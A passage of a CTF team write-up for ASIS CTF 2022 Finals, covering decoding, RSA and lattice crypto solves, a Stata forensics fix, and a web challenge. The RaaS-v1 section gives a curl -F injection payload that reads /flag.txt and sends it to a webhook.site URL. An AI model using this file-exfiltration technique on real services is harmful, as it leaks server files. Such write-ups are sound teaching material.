  _ISupper <span style="color:#f92672">=</span> _ISbit (<span style="color:#ae81ff">0</span>),        <span style="color:#75715e">/* UPPERCASE.  */</span>
  _ISlower <span style="color:#f92672">=</span> _ISbit (<span style="color:#ae81ff">1</span>),        <span style="color:#75715e">/* lowercase.  */</span>
  _ISalpha <span style="color:#f92672">=</span> _ISbit (<span style="color:#ae81ff">2</span>),        <span style="color:#75715e">/* Alphabetic.  */</span>
  _ISdigit <span style="color:#f92672">=</span> _ISbit (<span style="color:#ae81ff">3</span>),        <span style="color:#75715e">/* Numeric.  */</span>
  _ISxdigit <span style="color:#f92672">=</span> _ISbit (<span style="color:#ae81ff">4</span>),       <span style="color:#75715e">/* Hexadecimal numeric.  */</span>
  _ISspace <span style="color:#f92672">=</span> _ISbit (<span style="color:#ae81ff">5</span>),        <span style="color:#75715e">/* Whitespace.  */</span>
  _ISprint <span style="color:#f92672">=</span> _ISbit (<span style="color:#ae81ff">6</span>),        <span style="color:#75715e">/* Printing.  */</span>
  _ISgraph <span style="color:#f92672">=</span> _ISbit (<span style="color:#ae81ff">7</span>),        <span style="color:#75715e">/* Graphical.  */</span>
  _ISblank <span style="color:#f92672">=</span> _ISbit (<span style="color:#ae81ff">8</span>),        <span style="color:#75715e">/* Blank (usually SPC and TAB).  */</span>
  _IScntrl <span style="color:#f92672">=</span> _ISbit (<span style="color:#ae81ff">9</span>),        <span style="color:#75715e">/* Control character.  */</span>
  _ISpunct <span style="color:#f92672">=</span> _ISbit (<span style="color:#ae81ff">10</span>),       <span style="color:#75715e">/* Punctuation.  */</span>
  _ISalnum <span style="color:#f92672">=</span> _ISbit (<span style="color:#ae81ff">11</span>)        <span style="color:#75715e">/* Alphanumeric.  */</span>
};
</code></pre></div><p>In short, its just a &ldquo;character characteristic&rdquo; lookup table, a C way to check isalpha / etc.</p>
<p>The above code is equivalent to something like this in pseudocode:</p>
<pre tabindex="0"><code>storage = &quot;&quot;
for all char c in input:
  if c is alphabetic:
    storage += c
  else if c is space:
    if previous two in storage is ~=`+[a-zA-Z0-9]`:
      update the previous two to become upper case
    else:
      storage += &quot;/&quot;
  else:
    charset = &quot;@$_!\&quot;#%&amp;'()*+,-./:;&lt;=&gt;?\n&quot;
    if c in charset:
      index = charset.find(c)
      storage += f&quot;+{index}&quot;
    else:
      charset = &quot;[\\]^{|}~`\t&quot;
      if not in charset:
        return error and exit
      storage += f&quot;++{index}&quot;
if len(storage) mod 3 != 0:
  storage += &quot;/&quot; * (3 - len(storage) mod 3)
 
storage = base64_decode(storage)
</code></pre><p>At first, I was so puzzled as I misread the first condition thinking it only checks for numeric characters (turns out it is checking for alphanumeric characters instead, so it make perfect sense), and this makes no sense if the input is a flag.</p>
<p>And my teammate grhkm reminds me I should try base64 conversion first, and I see this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Compressin
g/short/messages/is/essential+Nso/ASIS/has/developed/new/one+xThe/flag/for/t
his/task/is+RASIS++ec0mprEs51nG+csHOr7+ct3xT+cmE5s49es+cASIS+d++g///
</code></pre></div><p>So clearly this is the flag, and we can just reverse the <code>++e</code> etc syntax with the algorithm we reverse above. And this yields us the flag easily.</p>
<h2 id="raas-v1-web-68-solves">RaaS-v1 (Web, 68 solves)<a hidden class="anchor" aria-hidden="true" href="#raas-v1-web-68-solves">#</a></h2>
<p><em>Solved by fsharp</em></p>
<p>We&rsquo;re given a URL and an archive file containing the source code for the webpage. The goal is to read the contents of <code>/flag.txt</code> by exploiting a vulnerability.</p>
<p>The webpage allows us to request any webpage with a request method of our choice and with the ability to send any form data. The source code is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#66d9ef">if</span>($_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>){
	<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;curl :thonk:&#39;</span>);
}

$url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost&#39;</span>;
$method <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;GET&#39;</span>;
$formParams <span style="color:#f92672">=</span> [];

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;url&#39;</span>])){
	$url <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;url&#39;</span>];
}

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;method&#39;</span>])){
	$method <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;method&#39;</span>];
}

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;formParams&#39;</span>])){ 
	$formParams <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;formParams&#39;</span>];
}

$cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;curl &#39;</span>;
$cmd <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;--proto -file &#39;</span>; 
$cmd <span style="color:#f92672">.=</span> <span style="color:#a6e22e">escapeshellarg</span>($url)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39; &#39;</span>;
$cmd <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;-X &#39;</span>;
$cmd <span style="color:#f92672">.=</span> <span style="color:#a6e22e">escapeshellarg</span>($method)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39; &#39;</span>;


<span style="color:#66d9ef">foreach</span>($formParams <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $value){
	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/^\w+$/&#34;</span>,$key)){
		$cmd <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;-F &#39;</span>;
		$cmd <span style="color:#f92672">.=</span> <span style="color:#a6e22e">escapeshellarg</span>($key<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;= &#39;</span><span style="color:#f92672">.</span>$value);
	}
}

<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Type: text/plain&#39;</span>);
<span style="color:#a6e22e">system</span>($cmd);
</code></pre></div><p>Our parameters are passed to the <code>escapeshellarg()</code> function, which adds quotes around them.</p>
<p>As hinted by the challenge description, the vulnerability could be found if one reads the documentation of the <code>curl</code> command carefully. Referring to <a href="https://curl.se/docs/manpage.html#-F">the <code>-F</code> section of its manpage</a>, it can be seen that custom headers could be added to the request by reading from a file as follows:</p>
<p><code>curl -F &quot;submit=OK;headers=@headerfile&quot; example.com</code></p>
<p>It is important to note that <code>$key</code> and <code>$value</code> are not filtered at all (e.g. check if characters like <code>@</code>, <code>;</code>, <code>=</code> or <code>/</code> are included), which means it is possible for us to use the above command format to read from any file.</p>
<p>By opening a webhook and sending data to it by navigating to <code>http://raas-v1.asisctf.com:9000/?url=https://webhook.site/blah&amp;formParams[a]=b;headers=@/flag.txt</code>, we can forge the following command:</p>
<p><code>curl --proto -file 'https://webhook.site/blah' -X 'GET' -F 'a= b;headers=@/flag.txt'</code></p>
<p>&hellip;and get the flag!</p>
<h2 id="bedouin-crypto-79-solves">Bedouin (Crypto, 79 solves)<a hidden class="anchor" aria-hidden="true" href="#bedouin-crypto-79-solves">#</a></h2>
<p><em>Solved by LifeIsHard</em></p>
<p>The challenge encrypts the message through RSA, but with a unique(ly weak) way of generating the parameters, defined as follows:</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">from secret import nbit, l, flag

def genbed(nbit, l):
    while True:
        zo = bin(getPrime(nbit))[2:]
        OZ = zo * l + '1'
        if isPrime(int(OZ)):
            return int(OZ)

p, q = [genbed(nbit, l) for _ in '01']
n = p * q
d = 1 ^ l ** nbit &lt;&lt; 3 ** 3
phi = (p - 1) * (q - 1)
e = inverse(d, phi)
m = bytes_to_long(flag)
c = pow(m, e, n)

if pow(c, d, n) == m:
    print(f'n = {n}')
    print(f'c = {c}')
</code></pre><p>In short, the algorithm first generates $p$ and $q$ by</p>
<ul>
<li>Defining $l$ and $b$ (<code>nbit</code> in the code), both unknown to us</li>
<li>Generates a (essentially) random $b$-digit binary string $zo$</li>
<li>Define $p = \underbrace{zo \mathbin\Vert zo \mathbin\Vert \cdots \mathbin\Vert zo}_{l , \mathrm{of} , zo} \mathbin\Vert 1$ and interpret it as a base-10 integer</li>
<li>If $p$ is not a prime, repeat the generation process. $q$ is generated in the same manner.</li>
</ul>
<p>Now, the algorithm generates the remaining RSA parameters by</p>
<ul>
<li>$N = pq$</li>
<li>$d = \left(27 \cdot l^{b}\right) \mathbin{|} 1$</li>
<li>$e = d^{-1} \ \mathrm{mod} \ (p - 1)(q - 1)$</li>
<li>$c = m^e \ \mathrm{mod} \ N$</li>
</ul>
<p>Firstly, from the output given we see that $N$ is a $617$-digit integer. On the other hand, the generation process shows that $p$ and $q$ have $(lb + 1)$ digits, meaning that $N = pq$ has either $2(lb + 1) - 1$ or $2(lb + 1)$ digits. From this, we deduce that $lb = 308$, which means $b$ is one of the divisors of $308 = 2^2 \cdot 7 \cdot 11$. Trying each divisor in order and computing the corresponding $d$, we get the correct answer $(l, b) = (11, 28)$.</p>
<h2 id="monward-crypto-30-solves">Monward (Crypto, 30 solves)<a hidden class="anchor" aria-hidden="true" href="#monward-crypto-30-solves">#</a></h2>
<p><em>Solved by Mystiz</em></p>
<p>Groebner basis is the perfect tool to solve annoying system of equations. Using the relation given by <code>monon(C, P) == monon(C, Q) == monon(C, R) == monon(C, enc)</code>, we can construct an ideal from which we can recover $a$, $d$ and $p$. See the code for more details:</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">V.&lt;a, d, p&gt; = ZZ['a, d, p']
terms = []
for (x, y) in [P, Q, R, enc]:
    terms.append(a * x^2 + y^2 - d * x^2 * y^2 - 1)
I = Ideal(V, terms)
I.groebner_basis()
# [a + 110062003148225401725628246404818446720450976623225313995311,
#  d + 154490734938099229849569067657352117192562308729750369601751,
#  209488070485061880311886074351169939903472896311680134404680]
</code></pre><p>Eventually we found</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p <span style="color:#f92672">=</span> <span style="color:#ae81ff">5237201762126547007797151858779248497586822407792003360117</span>
d <span style="color:#f92672">=</span> <span style="color:#ae81ff">2625317925697180384345488106025337735042363504009731201759</span>
a <span style="color:#f92672">=</span> <span style="color:#ae81ff">5156435618558632445909094488325020226459116348198759927263</span>
</code></pre></div><p>We can also retrieve the order of the curve being <code>q = 5237201762126547007797151858841639845712665151660067904384</code>, which can be factorized to</p>
<p>$$\begin{aligned}
2^7 &amp; \times 7 \times 1283 \times 537221 \times 922861 \times 2073361 \\
&amp; \times 14270791 \times 91806719 \times 1025744989 \times 3297907903.
\end{aligned}$$</p>
<p>Since I am lazy to map the Edward&rsquo;s curve into a standard elliptic curve for discrete log, I implemented the Pohlig-Hellman algorithm myself. Eventually we got the flag <code>ASIS{MoN7g0m3ry_EdwArd5_cuRv3}</code>.</p>
<h2 id="vindica-crypto-32-solves">Vindica (Crypto, 32 solves)<a hidden class="anchor" aria-hidden="true" href="#vindica-crypto-32-solves">#</a></h2>
<p><em>Solved by LifeIsHard</em></p>
<p>The challenge first generates parameters $p$, $q$, $e$, $n = pq$ and $N = (p^2 - 1)(q^2 - 1)$. It then encrypts the flag in a RSA-like protocol, defined as follows:</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">def two_layencrypt(msg, pkey):
    e, n, _ = pkey
    Zn = Zmod(n)
    m = bytes_to_long(msg)
    c = pow(m, e, n)
    _c = str(c)
    l = len(_c)
    _C = matrix(Zn, [[_c[:l//4], _c[l//4:l//2]], [_c[l//2:3*l//4], _c[3*l//4:l]]])
    assert gcd(det(_C), n) == 1
    C = _C ** e
    return C
</code></pre><p>In addition to the encrypted matrix, we are also given $e, n, N$.</p>
<p>In short, the algorithm</p>
<ul>
<li>Encrypts the flag with normal RSA by raising it to the $e^{\mathrm{th}}$ power modulo $n$.</li>
<li>Splits the base-10 digits of $c$ into four pieces $c_1, c_2, c_3, c_4$
<ul>
<li>For example, $c = 12345678 \to (c_1, c_2, c_3, c_4) = (12, 34, 56, 78)$.</li>
</ul>
</li>
<li>Encrypts the matrix $\bigl( \begin{smallmatrix} c_1 &amp; c_2 \ c_3 &amp; c_4 \end{smallmatrix} \bigr)$ with RSA again by raising it to the $e^{\mathrm{th}}$ power modulo $n$.</li>
</ul>
<p>It is clear that our goal is to recover the primes $p$ and $q$. We note that since we are given both $n$ and $N$, both of which are defined by $p$ and $q$, we have the following system of equations:</p>
<p>$$
\begin{cases}
n = pq \\
N = (p^2 - 1)(q^2 - 1)
\end{cases}
$$</p>
<h3 id="solution-1-lifeishard">Solution 1 (LifeIsHard)<a hidden class="anchor" aria-hidden="true" href="#solution-1-lifeishard">#</a></h3>
<p>One method to solve the equations is by rewriting $N = p^2q^2 - (p^2 + q^2) + 1 = n^2 + 2n + 1 - (p + q)^2$. Then, we can recover $p + q$. Finally, note that $p$ and $q$ are roots to the quadratic polynomial $(x - p)(x - q) = x^2 - (p + q)x + n$, we can factor $p$ and $q$.</p>
<p>Solve script (excerpt):</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">from z3 import *

p = Int('p')
q = Int('q')

print(solve((p**2 - 1)*(q**2 - 1) == N, p * q == n))
</code></pre><hr>
<h3 id="solution-2-grhkm">Solution 2 (grhkm)<a hidden class="anchor" aria-hidden="true" href="#solution-2-grhkm">#</a></h3>
<p>Another method to solve this is using Groebner basis. We construct the Ideal $\left&lt;n - pq, N - (p^2 - 1)(q^2 - 1)\right&gt; \subset \mathbb{Z}[p, q]$, and hope one of the reduced terms is univariate. Note that the default ordering in Sage is <code>degrevlex</code>, standing for &ldquo;Degree reverse lexicographic&rdquo;. However, the degree of the reduced basis doesn&rsquo;t matter for us, just that it is univariate. Therefore, the <code>lex</code> ordering is more suitable for us.</p>
<p>Solve script (excerpt):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p, q <span style="color:#f92672">=</span> ZZ[<span style="color:#e6db74">&#39;p, q&#39;</span>]<span style="color:#f92672">.</span>change_ring(order<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;lex&#39;</span>)<span style="color:#f92672">.</span>gens()
I <span style="color:#f92672">=</span> Ideal([n <span style="color:#f92672">-</span> p <span style="color:#f92672">*</span> q, N <span style="color:#f92672">-</span> (p<span style="color:#f92672">^</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q<span style="color:#f92672">^</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)])
<span style="color:#66d9ef">for</span> basis <span style="color:#f92672">in</span> I<span style="color:#f92672">.</span>groebner_basis():
    <span style="color:#66d9ef">try</span>:
        print(basis<span style="color:#f92672">.</span>univariate_polynomial()<span style="color:#f92672">.</span>roots())
    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">TypeError</span> <span style="color:#66d9ef">as</span> e:
        <span style="color:#66d9ef">pass</span>
</code></pre></div><hr>
<p>Finally, we can recover $c$ by $c = C^{(e^{-1} \ \mathrm{mod} \ N)}$, and decrypt RSA as usual for the flag.</p>
<div class="alert info">
  Why is $N$ even provided? Well, it is supposed to serve as the public key modulus for the matrix group $GL(2, \mathbb{Z} / n\mathbb{Z})$, also known as the group of all invertible $2 \times 2$ matrices. By considering the size of the group under mod $p$ and mod $q$ and applying the Chinese Remainder Theorem, we get the modulus! This is also how the decryption process works.
</div>
  
<h2 id="rhyton-crypto-17-solves">Rhyton (Crypto, 17 solves)<a hidden class="anchor" aria-hidden="true" href="#rhyton-crypto-17-solves">#</a></h2>
<p><em>Solved by Mystiz, LifeIsHard, grhkm</em></p>
<p>In the problem, we are given <code>L = 110</code> sets of data, generated through the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># nbit, delta, L = 512, 0.14, 110</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_rhyton</span>(nbit, delta, L):
	p, q <span style="color:#f92672">=</span> [getPrime(nbit) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;01&#39;</span>]
	n <span style="color:#f92672">=</span> p <span style="color:#f92672">*</span> q
	D <span style="color:#f92672">=</span> int(n <span style="color:#f92672">**</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> delta))
	phi <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)

	V <span style="color:#f92672">=</span> [getRandomRange(<span style="color:#ae81ff">1</span>, n <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(L)]
	U <span style="color:#f92672">=</span> [phi <span style="color:#f92672">*</span> v <span style="color:#f92672">//</span> n <span style="color:#66d9ef">for</span> v <span style="color:#f92672">in</span> V]

	W, i <span style="color:#f92672">=</span> [], <span style="color:#ae81ff">0</span>
	<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
		w <span style="color:#f92672">=</span> getRandomRange(phi <span style="color:#f92672">*</span> V[i] <span style="color:#f92672">-</span> U[i] <span style="color:#f92672">*</span> n <span style="color:#f92672">-</span> D, phi <span style="color:#f92672">*</span> V[i] <span style="color:#f92672">-</span> U[i] <span style="color:#f92672">*</span> n <span style="color:#f92672">+</span> D)
		<span style="color:#66d9ef">if</span> abs(phi <span style="color:#f92672">*</span> V[i] <span style="color:#f92672">-</span> U[i] <span style="color:#f92672">*</span> n <span style="color:#f92672">-</span> w) <span style="color:#f92672">&lt;</span> D <span style="color:#f92672">and</span> w <span style="color:#f92672">&lt;</span> n:
			W<span style="color:#f92672">.</span>append(w)
			i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
		<span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> L:
			<span style="color:#66d9ef">break</span>
	<span style="color:#66d9ef">return</span> (p, q, U, V, W)
</code></pre></div><p>In short, the function</p>
<ul>
<li>Generates 512-bit primes $p$ and $q$ and computes $\varphi = (p - 1)(q - 1)$ and $N = pq$</li>
<li>Defines $D := \lfloor N^{0.86} \rfloor$</li>
<li>Generates 110 random integers $v_i \in [1, N - 1)$</li>
<li>Defines $u_i := \lfloor \frac{\varphi v_i}{N} \rfloor$</li>
<li>Defines $X_i := \varphi v_i - N u_i$</li>
<li>Generate 110 random integers $w_i \in [X_i - D, X_i + D)$.</li>
<li>Returns the data $(p, q, (v_i, u_i, w_i))$.</li>
</ul>
<p>Firstly, we can rewrite the defining definition of $w_i$ as</p>
<p>$$|w_i - X_i| &lt; D \implies |w_i + Nu_i - \varphi v_i| &lt; D \approx N^{0.86}$$</p>
<p>This means that the quantity $w_i + Nu_i - \varphi v_i$ is &ldquo;small&rdquo;. Furthermore, since the quantities $N, w_i, v_i$ are known, this is a standard application of lattice-reduction algorithms. As a note, we may write $\varphi = N - \varphi'$, where $\varphi' \approx N^{0.5}$, which may perform better in the lattice.</p>
<p>Lattice construction ($110 \times 112$):</p>
<p>$$\begin{pmatrix}
w_0 &amp; w_1 &amp; \cdots &amp; w_{109} &amp; 1 &amp; n \\
-v_0 &amp; -v_1 &amp; \cdots &amp; -v_{109} &amp; 0 &amp; -1 \\
n &amp; 0 &amp; \cdots &amp; 0 &amp; 0 &amp; 0 \\
0 &amp; n &amp; \cdots &amp; 0 &amp; 0 &amp; 0 \\
\vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots &amp; \vdots \\
0 &amp; 0 &amp; \cdots &amp; n &amp; 0 &amp; 0
\end{pmatrix}$$</p>
<p>Solve script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">110</span>):
    A[<span style="color:#ae81ff">0</span>,   i]   <span style="color:#f92672">=</span> W[i]
    A[<span style="color:#ae81ff">1</span>,   i]   <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>V[i]
    A[<span style="color:#ae81ff">2</span><span style="color:#f92672">+</span>i, i]   <span style="color:#f92672">=</span> n

<span style="color:#66d9ef">if</span> <span style="color:#66d9ef">True</span>:
    A[<span style="color:#ae81ff">0</span>,   <span style="color:#ae81ff">110</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
    A[<span style="color:#ae81ff">0</span>,   <span style="color:#ae81ff">111</span>] <span style="color:#f92672">=</span> n
    A[<span style="color:#ae81ff">1</span>,   <span style="color:#ae81ff">111</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>

weights <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span><span style="color:#f92672">/</span>int(n<span style="color:#f92672">^</span><span style="color:#ae81ff">0.86</span>) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">110</span>)] <span style="color:#f92672">+</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span><span style="color:#f92672">/</span>int(n<span style="color:#f92672">^</span><span style="color:#ae81ff">0.5</span>)]

Q <span style="color:#f92672">=</span> diagonal_matrix(weights)

A <span style="color:#f92672">*=</span> Q
A <span style="color:#f92672">=</span> A<span style="color:#f92672">.</span>LLL() <span style="color:#75715e"># &lt;-</span>
A <span style="color:#f92672">/=</span> Q

</code></pre></div><div class="alert info">
  Fun fact: The solve script works with $4$ data points instead of $110$.
</div>
  
<h2 id="basic-forensics--misc-34-solves">Basic (Forensics + Misc, 34 solves)<a hidden class="anchor" aria-hidden="true" href="#basic-forensics--misc-34-solves">#</a></h2>
<p><em>Solved by fsharp</em></p>
<p>A file called <code>basic.raw</code> is given to us.</p>
<p>Opening it in a hex editor, it appears to be a corrupted Stata .dta file. Referring to <a href="https://www.loc.gov/preservation/digital/formats/fdd/fdd000471.shtml">a website that describes the file format</a> and <a href="http://www.stata-press.com/data/r14/odd1.dta">the sample file it references</a>, we can notice 3 errors with the file and fix them manually as follows:</p>
<ol>
<li>The beginning of the file should be replaced with <code>&lt;stata_dta&gt;&lt;header&gt;&lt;release&gt;118&lt;/release&gt;&lt;byteo</code>.</li>
<li>The end of the file should be replaced with <code>rls&gt;&lt;/strls&gt;&lt;value_labels&gt;&lt;/value_labels&gt;&lt;/stata_dta&gt;</code>.</li>
<li>&lsquo;Blank&rsquo; regions of the file should contain <code>0x00</code>s. So, replace the <code>0xA3</code>s in the <code>varnames</code> section with <code>0x00</code>s.</li>
</ol>
<p>Afterwards, we can read the file using the Pandas library. We get a few hundred rows of data, where each row contains 3 columns:</p>
<ol>
<li><code>position</code>: A number.</li>
<li><code>isflagchar</code>: Is this a character for the flag?</li>
<li><code>md5charsalt</code>: An MD5 hash.</li>
</ol>
<p>The description of the <code>md5charsalt</code> variable given by the file is specifically <code>md5(char + 'SALT')</code>. I took it literally and tried to find the characters with the salt as <code>SALT</code>, but none were found.</p>
<p>Initially, I was confused with what the challenge was asking for. However, <a href="https://twitter.com/mystiz613">Mystiz</a> looked up a few of those hashes on reverse MD5 websites and found that the salt was actually <code>s4Lt</code>. Thanks to his help and with a little more guessing, I was able to complete my script and solve this challenge:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> md5
<span style="color:#f92672">from</span> pandas <span style="color:#f92672">import</span> read_stata

df <span style="color:#f92672">=</span> read_stata(<span style="color:#e6db74">&#34;repaired.dta&#34;</span>)

hashes <span style="color:#f92672">=</span> set()
flag <span style="color:#f92672">=</span> []

<span style="color:#66d9ef">for</span> (position, isflagchar, md5charsalt) <span style="color:#f92672">in</span> zip(df[<span style="color:#e6db74">&#34;position&#34;</span>], df[<span style="color:#e6db74">&#34;isflagchar&#34;</span>], df[<span style="color:#e6db74">&#34;md5charsalt&#34;</span>]):
    <span style="color:#66d9ef">if</span> isflagchar <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Y&#39;</span>:
        hashes<span style="color:#f92672">.</span>add(md5charsalt)
        flag<span style="color:#f92672">.</span>append([position, md5charsalt])

hashes <span style="color:#f92672">=</span> list(hashes)
flag <span style="color:#f92672">=</span> [md5charsalt <span style="color:#66d9ef">for</span> [position, md5charsalt] <span style="color:#f92672">in</span> sorted(flag)]

<span style="color:#66d9ef">for</span> hash <span style="color:#f92672">in</span> hashes:
    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">127</span>):
        s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;s4Lt&#34;</span> <span style="color:#f92672">+</span> chr(c)
        <span style="color:#66d9ef">if</span> md5(s<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> hash:
            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(flag)):
                <span style="color:#66d9ef">if</span> flag[i] <span style="color:#f92672">==</span> hash:
                    flag[i] <span style="color:#f92672">=</span> chr(c)
            <span style="color:#66d9ef">break</span>

print(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(flag))
</code></pre></div>
</div>
  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://b6a.black/tags/ctf/">ctf</a></li>
      <li><a href="https://b6a.black/tags/asis-ctf/">asis-ctf</a></li>
    </ul>
    <nav class="paginav">
      <a class="prev" href="https://b6a.black/posts/2023-02-03-idekctf/">
        <span class="title">« Prev Page</span>
        <br>
        <span>idekCTF 2022* Writeup</span>
      </a>
      <a class="next" href="https://b6a.black/posts/2023-01-09-tetctf-pwn01/">
        <span class="title">Next Page »</span>
        <br>
        <span>TetCTF 2023: pwn01</span>
      </a>
    </nav>
  </footer>
</article>
<aside class="toc-container">
  <a href="#" style="text-decoration: none; font-weight: 700;">
    ASIS CTF 2022 Finals Writeup
  </a>
  <div class="js-toc"></div>
</aside>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.css" integrity="sha512-SFw7k74K3983tyOlJIHa8atr9Ppef3Kix5cmifwzU7ZdtU2E0FRuOVRtd3ENpMJ8sNCie5hlb/0j23efcdQJXA==" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.js" integrity="sha512-oD3xGN8YTxenx6tdS4D/RKqO4OtORBQtAb2/FseM17GGMIi6jMwKUBc8duX4A5RwMOGGXoFBZrsqbOk8GpXFgQ==" crossorigin="anonymous"></script>

<script type="text/javascript">
  tocbot.init({
    headingSelector: 'h1, h2, h3, h4',
    orderedList: false,
    headingLabelCallback: s => s.substr(0, s.length-1),
    collapseDepth: 2
  });
</script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/1.7.1/viz.js"> </script>
<script type="text/javascript">
  (function () {
    const vizPrefix = "language-viz-";
    Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
      let engine;
      x.getAttribute("class").split(" ").forEach(function (cls) {
        if (cls.startsWith(vizPrefix)) {
          engine = cls.substr(vizPrefix.length);
        }
      });
      const image = new DOMParser().parseFromString(Viz(x.innerText, { format: "svg", engine: engine }), "image/svg+xml");
      x.parentNode.insertBefore(image.documentElement, x);
      x.style.display = 'none'
      x.parentNode.style.backgroundColor = "white"
    });
  })();
</script>
    </main><footer class="footer">
    <span>&copy; 2025 <a href="https://b6a.black/">Black Bauhinia</a></span>
    <span>&middot;</span>
    <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
    <span>&middot;</span>
    <span>Theme <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
    <button class="top-link" id="top-link" type="button" accesskey="g">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path d="M12 6H0l6-6z" />
        </svg>
    </button>
</a>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
